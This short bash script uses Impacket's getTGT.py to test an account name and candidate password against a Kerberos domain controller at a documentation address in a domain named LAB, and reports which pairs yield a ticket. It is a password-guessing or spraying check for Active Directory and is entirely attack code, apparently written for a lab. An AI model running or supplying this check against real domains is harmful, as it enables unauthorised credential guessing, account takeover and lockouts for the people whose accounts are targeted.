#!/bin/bash
reply=$(getTGT.py "LAB/${account}:${candidate}" -dc-ip 192.0.2.10)
if echo "$reply" | grep -q "Saving ticket"; then
  echo "VALID: ${account}:${candidate}"
fi
